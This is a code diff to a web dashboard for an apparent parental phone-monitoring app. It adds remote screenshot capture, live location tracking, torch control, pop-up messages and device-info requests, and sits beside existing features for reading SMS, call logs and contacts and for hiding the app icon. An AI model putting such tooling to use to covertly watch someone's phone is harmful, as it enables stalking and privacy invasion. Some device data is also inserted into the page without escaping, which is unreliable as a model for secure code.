@@ -961,7 +961,22 @@
               <button id="unhide-icon-btn" class="btn btn-ghost btn-icon hidden" onclick="remoteToggleIconVisibility('unhide_icon')" title="Restore app icon">
                 <i class="fa-solid fa-eye"></i>
               </button>
+              <button id="torch-on-btn" class="btn btn-teal btn-icon" onclick="triggerTorch(true)" title="Torch ON">
+                <i class="fa-solid fa-lightbulb"></i>
+              </button>
+              <button id="torch-off-btn" class="btn btn-ghost btn-icon" onclick="triggerTorch(false)" title="Torch OFF">
+                <i class="fa-solid fa-lightbulb" style="opacity:.4;"></i>
+              </button>
             </div>
+          </div>
+          <div style="padding:10px 14px;border-top:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+            <span style="font-size:11px;color:var(--text-3);"><i class="fa-solid fa-comment-dots"></i> Toast:</span>
+            <input type="text" id="toast-input" placeholder="Send a message to child's phone…"
+              style="flex:1;min-width:160px;" onkeydown="if(event.key==='Enter')sendToast()">
+            <button class="btn btn-ghost" onclick="sendToast()"><i class="fa-solid fa-paper-plane"></i> Send</button>
+            <button id="live-loc-btn" class="btn btn-purple" onclick="toggleLiveLocation()">
+              <i class="fa-solid fa-location-crosshairs"></i> Live Location
+            </button>
           </div>
         </div>
 
@@ -1093,6 +1108,25 @@
           <div class="card-body">
             <div id="location-display" style="font-family:var(--font-mono);font-size:12px;color:var(--text-2);">No location data yet</div>
             <iframe id="location-map-frame"></iframe>
+          </div>
+        </div>
+
+        <!-- Screenshot + Device Info -->
+        <div class="card" id="sysinfo-card">
+          <div class="card-header">
+            <div class="card-title"><i class="fa-solid fa-camera-viewfinder" style="color:#22d3ee;"></i> Screenshot & Device Info</div>
+            <div class="ctrl-bar">
+              <button class="btn btn-teal" onclick="requestScreenshot()"><i class="fa-solid fa-camera"></i> Take Screenshot</button>
+              <button class="btn btn-ghost" onclick="requestDeviceInfo()"><i class="fa-solid fa-circle-info"></i> Get Info</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <div id="screenshot-display" style="min-height:80px;display:flex;align-items:center;justify-content:center;background:var(--bg-void);border-radius:10px;border:1px dashed var(--border);">
+              <span style="color:var(--text-3);font-size:12px;">No screenshot yet — click Take Screenshot</span>
+            </div>
+            <div id="device-info-display" style="margin-top:12px;font-family:var(--font-mono);font-size:11px;color:var(--text-2);line-height:1.8;background:var(--bg-void);border-radius:10px;border:1px solid var(--border);padding:12px;">
+              <span style="color:var(--text-3);">Device info will appear here.</span>
+            </div>
           </div>
         </div>
 
@@ -1475,7 +1509,8 @@
           handleAppBlockedAlert(data);
         } else if (['photo_result','audio_result','location_result',
                     'call_log_result','sms_result','incoming_sms',
-                    'contacts_result','installed_apps_result','get_info_result'].includes(data.type)) {
+                    'contacts_result','installed_apps_result','get_info_result',
+                    'screenshot_result','take_photo_result'].includes(data.type)) {
           handleMonitoringResult(data);
         } else if (data.type === 'error') {
           document.getElementById('explorer-loader').style.display = 'none';
@@ -1775,6 +1810,52 @@
     document.getElementById('apps-list').innerHTML = `<span style="color:var(--amber);font-size:12px;">📡 Fetching apps…</span>`;
   }
 
+  function requestScreenshot() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'take_screenshot' }));
+    document.getElementById('screenshot-display').innerHTML = `<span style="color:var(--amber);font-size:12px;">📸 Capturing screen…</span>`;
+    switchTab('tab-monitor');
+  }
+
+  function requestDeviceInfo() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'get_info' }));
+    document.getElementById('device-info-display').innerHTML = `<span style="color:var(--amber);">⏳ Fetching device info…</span>`;
+    switchTab('tab-monitor');
+  }
+
+  function triggerTorch(on) {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: on ? 'torch_on' : 'torch_off' }));
+    showToast(on ? '🔦 Torch ON sent' : '🔦 Torch OFF sent', 'info');
+  }
+
+  function sendToast() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    const msg = document.getElementById('toast-input').value.trim();
+    if (!msg) { showToast('⚠️ Type a message first', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'show_toast', message: msg }));
+    document.getElementById('toast-input').value = '';
+    showToast('💬 Toast sent', 'success');
+  }
+
+  let isLiveLocationActive = false;
+  function toggleLiveLocation() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    isLiveLocationActive = !isLiveLocationActive;
+    const btn = document.getElementById('live-loc-btn');
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: isLiveLocationActive ? 'start_live_location' : 'stop_live_location' }));
+    if (isLiveLocationActive) {
+      btn.classList.add('btn-gradient'); btn.classList.remove('btn-purple');
+      btn.innerHTML = `<i class="fa-solid fa-location-crosshairs"></i> Live: ON`;
+      showToast('🗺️ Live location started (30s updates)', 'success');
+    } else {
+      btn.classList.remove('btn-gradient'); btn.classList.add('btn-purple');
+      btn.innerHTML = `<i class="fa-solid fa-location-crosshairs"></i> Live Location`;
+      showToast('⏹️ Live location stopped', 'info');
+    }
+  }
+
   function filterContacts() {
     const q = document.getElementById('contacts-search').value.toLowerCase();
     const filtered = cachedContacts.filter(c => c.name?.toLowerCase().includes(q) || c.number?.includes(q));
@@ -1825,6 +1906,31 @@
       const time = new Date(data.time).toLocaleTimeString();
       document.getElementById('snapshot-display').innerHTML =
         `<div style="text-align:center;"><img src="${data.image}" style="border-radius:10px;max-height:220px;border:1px solid var(--border);"><p style="font-size:11px;color:var(--text-2);margin-top:6px;">📷 ${facing} — ${time}</p></div>`;
+    }
+
+    if (data.type === 'take_photo_result' && data.error) {
+      document.getElementById('snapshot-display').innerHTML =
+        `<span style="color:#f87171;font-size:12px;">❌ Camera error: ${data.error}</span>`;
+    }
+
+    if (data.type === 'screenshot_result') {
+      const time = new Date(data.time).toLocaleTimeString();
+      document.getElementById('screenshot-display').innerHTML =
+        `<div style="text-align:center;"><img src="${data.image}" style="border-radius:10px;max-height:260px;border:1px solid var(--border);"><p style="font-size:11px;color:var(--text-2);margin-top:6px;">📸 Captured — ${time}</p></div>`;
+    }
+
+    if (data.type === 'get_info_result') {
+      const rows = [
+        ['Model', `${data.brand || ''} ${data.model || ''}`.trim()],
+        ['Android', `${data.android_version || '—'} (SDK ${data.sdk || '—'})`],
+        ['Battery', `${data.battery !== undefined ? data.battery + '%' : '—'}${data.is_charging ? ' ⚡' : ''}`],
+        ['Device ID', data.device_id || data.deviceId || '—'],
+        ['Screen Used', `${data.screen_time_used !== undefined ? data.screen_time_used + ' min' : '—'}`],
+        ['Blocked Apps', (data.blocked_apps || 'none')]
+      ];
+      document.getElementById('device-info-display').innerHTML = rows.map(([k, v]) =>
+        `<div style="display:flex;gap:8px;"><span style="color:var(--text-3);min-width:110px;">${k}</span><span style="color:var(--text-1);word-break:break-all;">${v}</span></div>`
+      ).join('');
     }
 
     if (data.type === 'audio_result') {
@@ -1905,7 +2011,7 @@
   function handleCommandResponse(data) {
     const icon = data.success ? '✅' : '❌';
     const t = data.success ? 'success' : 'error';
-    const names = { lock:'Lock Screen', buzz:'Vibrate', hide_icon:'Hide Icon', unhide_icon:'Restore Icon', update_policy:'Policy Update' };
+    const names = { lock:'Lock Screen', buzz:'Vibrate', hide_icon:'Hide Icon', unhide_icon:'Restore Icon', update_policy:'Policy Update', torch_on:'Torch ON', torch_off:'Torch OFF', show_toast:'Toast', take_screenshot:'Screenshot', get_info:'Device Info', start_live_location:'Live Location Start', stop_live_location:'Live Location Stop' };
     showToast(`${icon} ${names[data.command] || data.command}: ${data.message}`, t);
   }
 
